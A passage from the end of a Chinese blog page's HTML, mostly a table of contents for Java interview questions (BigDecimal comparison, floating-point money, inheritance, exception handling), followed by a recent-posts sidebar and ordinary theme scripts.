class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%B8%83-%E3%80%81%E6%9D%A1%E4%BB%B6%E7%BC%96%E8%AF%91"><span class="toc-number">14.1.9.</span> <span class="toc-text">糖块七 、条件编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%85%AB-%E3%80%81-%E6%96%AD%E8%A8%80"><span class="toc-number">14.1.10.</span> <span class="toc-text">糖块八 、 断言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%B9%9D-%E3%80%81-%E6%95%B0%E5%80%BC%E5%AD%97%E9%9D%A2%E9%87%8F"><span class="toc-number">14.1.11.</span> <span class="toc-text">糖块九 、 数值字面量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%8D%81-%E3%80%81-for-each"><span class="toc-number">14.1.12.</span> <span class="toc-text">糖块十 、 for-each</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%8D%81%E4%B8%80-%E3%80%81-try-with-resource"><span class="toc-number">14.1.13.</span> <span class="toc-text">糖块十一 、 try-with-resource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%8D%81%E4%BA%8C%E3%80%81Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">14.1.14.</span> <span class="toc-text">糖块十二、Lambda表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91"><span class="toc-number">14.1.15.</span> <span class="toc-text">可能遇到的坑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%9B%E5%9E%8B"><span class="toc-number">14.1.15.1.</span> <span class="toc-text">泛型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E8%A3%85%E7%AE%B1%E4%B8%8E%E6%8B%86%E7%AE%B1"><span class="toc-number">14.1.15.2.</span> <span class="toc-text">自动装箱与拆箱</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%BC%BAfor%E5%BE%AA%E7%8E%AF"><span class="toc-number">14.1.15.3.</span> <span class="toc-text">增强for循环</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">14.1.16.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88Java%E4%B8%8D%E6%94%AF%E6%8C%81%E5%A4%9A%E7%BB%A7%E6%89%BF%EF%BC%9F"><span class="toc-number">15.</span> <span class="toc-text">✅为什么Java不支持多继承？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-14"><span class="toc-number">15.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-6"><span class="toc-number">15.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%B1%E5%BD%A2%E7%BB%A7%E6%89%BF%E9%97%AE%E9%A2%98"><span class="toc-number">15.3.</span> <span class="toc-text">菱形继承问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-8%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BB%A7%E6%89%BF"><span class="toc-number">15.4.</span> <span class="toc-text">Java 8中的多继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88Java%E4%B8%AD%E7%9A%84main%E6%96%B9%E6%B3%95%E5%BF%85%E9%A1%BB%E6%98%AFpublic-static-void%E7%9A%84%EF%BC%9F"><span class="toc-number">15.5.</span> <span class="toc-text">✅为什么Java中的main方法必须是public static void的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-15"><span class="toc-number">15.6.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-main-%E6%96%B9%E6%B3%95%E6%98%AF%E5%85%AC%E6%9C%89%E7%9A%84%EF%BC%88public%EF%BC%89%EF%BC%9F"><span class="toc-number">15.6.1.</span> <span class="toc-text">为什么 main 方法是公有的（public）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-main-%E6%96%B9%E6%B3%95%E6%98%AF%E9%9D%99%E6%80%81%E7%9A%84%EF%BC%88static%EF%BC%89%EF%BC%9F"><span class="toc-number">15.6.2.</span> <span class="toc-text">为什么 main 方法是静态的（static）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-main-%E6%96%B9%E6%B3%95%E6%B2%A1%E6%9C%89%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%88void%EF%BC%89%EF%BC%9F"><span class="toc-number">15.6.3.</span> <span class="toc-text">为什么 main 方法没有返回值（void）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-main-%E6%96%B9%E6%B3%95%E7%9A%84%E5%85%A5%E5%8F%82%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84%EF%BC%88String-%EF%BC%89"><span class="toc-number">15.6.4.</span> <span class="toc-text">为什么 main 方法的入参是字符串数组（String[]）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88JDK-9%E4%B8%AD%E6%8A%8AString%E7%9A%84char-%E6%94%B9%E6%88%90%E4%BA%86byte-%EF%BC%9F"><span class="toc-number">16.</span> <span class="toc-text">✅为什么JDK 9中把String的char[]改成了byte[]？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-16"><span class="toc-number">16.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">17.</span> <span class="toc-text">✅为什么不建议使用异常控制业务流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-17"><span class="toc-number">17.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%94%A8BigDecimal%E7%9A%84equals%E6%96%B9%E6%B3%95%E5%81%9A%E7%AD%89%E5%80%BC%E6%AF%94%E8%BE%83%EF%BC%9F"><span class="toc-number">18.</span> <span class="toc-text">✅为什么不能用BigDecimal的equals方法做等值比较？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-18"><span class="toc-number">18.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-7"><span class="toc-number">18.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BigDecimal%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">18.3.</span> <span class="toc-text">BigDecimal的比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BigDecimal%E7%9A%84equals%E5%8E%9F%E7%90%86"><span class="toc-number">18.4.</span> <span class="toc-text">BigDecimal的equals原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%A0%87%E5%BA%A6%E4%B8%8D%E5%90%8C"><span class="toc-number">18.5.</span> <span class="toc-text">为什么标度不同</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BigDecimal-long-%E5%92%8CBigDecimal-int"><span class="toc-number">18.5.0.1.</span> <span class="toc-text">BigDecimal(long) 和BigDecimal(int)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BigDecimal-double"><span class="toc-number">18.5.0.2.</span> <span class="toc-text">BigDecimal(double)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BigDecimal-string"><span class="toc-number">18.5.0.3.</span> <span class="toc-text">BigDecimal(string)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%AF%94%E8%BE%83BigDecimal"><span class="toc-number">18.6.</span> <span class="toc-text">如何比较BigDecimal</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%94%A8%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E9%87%91%E9%A2%9D%EF%BC%9F"><span class="toc-number">19.</span> <span class="toc-text">✅为什么不能用浮点数表示金额？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-19"><span class="toc-number">19.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-8"><span class="toc-number">19.2.</span> <span class="toc-text">扩展知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6"><span class="toc-number">19.2.1.</span> <span class="toc-text">十进制转二进制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E6%89%80%E6%9C%89%E6%95%B0%E9%83%BD%E8%83%BD%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA"><span class="toc-number">19.2.2.</span> <span class="toc-text">不是所有数都能用二进制表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IEEE-754"><span class="toc-number">19.2.3.</span> <span class="toc-text">IEEE 754</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%BF%E5%85%8D%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1"><span class="toc-number">19.2.4.</span> <span class="toc-text">避免精度丢失</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AF%B9Java%E4%B8%AD%E7%9A%84%E8%B4%9F%E6%95%B0%E5%8F%96%E7%BB%9D%E5%AF%B9%E5%80%BC%E7%BB%93%E6%9E%9C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%98%AF%E6%AD%A3%E6%95%B0%EF%BC%9F"><span class="toc-number">20.</span> <span class="toc-text">✅为什么对Java中的负数取绝对值结果不一定是正数？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-20"><span class="toc-number">20.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-9"><span class="toc-number">20.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E5%9E%8B%E7%9A%84%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4"><span class="toc-number">20.3.</span> <span class="toc-text">整型的取值范围</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">20.3.1.</span> <span class="toc-text">超出范围怎么办</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BB%BA%E8%AE%AE%E5%A4%9A%E7%94%A8%E7%BB%84%E5%90%88%E5%B0%91%E7%94%A8%E7%BB%A7%E6%89%BF%EF%BC%9F"><span class="toc-number">21.</span> <span class="toc-text">✅为什么建议多用组合少用继承？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-21"><span class="toc-number">21.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E4%B8%8E%E7%BB%A7%E6%89%BF%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB"><span class="toc-number">21.1.1.</span> <span class="toc-text">组合与继承的区别和联系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9%E5%AF%B9%E6%AF%94"><span class="toc-number">21.1.2.</span> <span class="toc-text">优缺点对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9"><span class="toc-number">21.1.3.</span> <span class="toc-text">如何选择</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E5%BB%BA%E8%AE%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-number">22.</span> <span class="toc-text">✅为什么建议自定义一个无参构造函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-22"><span class="toc-number">22.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E5%9C%A8JDK%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%AD%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%90%8C"><span class="toc-number">23.</span> <span class="toc-text">✅为什么这段代码在JDK不同版本中结果不同</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-23"><span class="toc-number">23.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E7%8E%B0%E5%9C%A8JDK%E7%9A%84%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">24.</span> <span class="toc-text">✅现在JDK的最新版本是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-24"><span class="toc-number">24.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%A5%E4%B8%8B%E5%85%B3%E4%BA%8E%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9C%89%E5%93%AA%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="toc-number">25.</span> <span class="toc-text">✅以下关于异常处理的代码有哪些问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-25"><span class="toc-number">25.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95-5"><span class="toc-number">25.2.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%A6%82%E4%BD%95%E4%BC%98%E5%8C%96"><span class="toc-number">25.3.</span> <span class="toc-text">上述代码，如何优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#try-with-resource%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">25.4.</span> <span class="toc-text">try-with-resource的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java7%E4%B8%AD%E8%BF%98%E5%AF%B9%E5%BC%82%E5%B8%B8%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BC%98%E5%8C%96%EF%BC%9F"><span class="toc-number">25.5.</span> <span class="toc-text">Java7中还对异常做了哪些优化？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%B8%AD%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%EF%BC%9F%E4%B8%80%E8%88%AC%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E3%80%82"><span class="toc-number">25.6.</span> <span class="toc-text">Java中异常的处理方式有哪几种？一般如何选择。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E6%9C%89%E4%BA%86equals%E4%B8%BA%E5%95%A5%E9%9C%80%E8%A6%81hashCode%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">26.</span> <span class="toc-text">✅有了equals为啥需要hashCode方法？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-26"><span class="toc-number">26.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E7%B1%BB%E4%B8%AD%E7%9A%84private%E4%BF%AE%E9%A5%B0%E7%9A%84String%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC"><span class="toc-number">27.</span> <span class="toc-text">✅怎么修改一个类中的private修饰的String参数的值</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-27"><span class="toc-number">27.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8-Setter-%E6%96%B9%E6%B3%95"><span class="toc-number">27.1.1.</span> <span class="toc-text">1. 使用 Setter 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%B0%84"><span class="toc-number">27.1.2.</span> <span class="toc-text">2. 使用反射</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E9%87%8F%E6%98%AF%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E8%BF%9B%E5%85%A5%E5%88%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">✅字符串常量是什么时候进入到字符串常量池的？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-28"><span class="toc-number">28.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/57079/" title="关于二次元的分析报告"><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/571.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于二次元的分析报告"/></a><div class="content"><a class="title" href="/post/57079/" title="关于二次元的分析报告">关于二次元的分析报告</a><time datetime="2025-12-07T21:46:37.000Z" title="Created 2025-12-07 21:46:37">2025-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/14858/" title="2025年11月30日网易新闻收录"><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/301.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年11月30日网易新闻收录"/></a><div class="content"><a class="title" href="/post/14858/" title="2025年11月30日网易新闻收录">2025年11月30日网易新闻收录</a><time datetime="2025-11-30T19:44:30.000Z" title="Created 2025-11-30 19:44:30">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/250/" title="闺蜜关系分析报告"><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/185.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="闺蜜关系分析报告"/></a><div class="content"><a class="title" href="/post/250/" title="闺蜜关系分析报告">闺蜜关系分析报告</a><time datetime="2025-11-29T19:24:00.000Z" title="Created 2025-11-29 19:24:00">2025-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/30270/" title="关于人性别之间的差异"><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/264.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于人性别之间的差异"/></a><div class="content"><a class="title" href="/post/30270/" title="关于人性别之间的差异">关于人性别之间的差异</a><time datetime="2025-11-27T08:46:25.000Z" title="Created 2025-11-27 08:46:25">2025-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/37181/" title="获取新闻列表并调用大模型总结"><img src="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/110.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="获取新闻列表并调用大模型总结"/></a><div class="content"><a class="title" href="/post/37181/" title="获取新闻列表并调用大模型总结">获取新闻列表并调用大模型总结</a><time datetime="2025-11-16T17:20:17.000Z" title="Created 2025-11-16 17:20:17">2025-11-16</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2021 - 2025 By Leonardo</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script src="/js/scroll-disable-blur.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章🔍" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>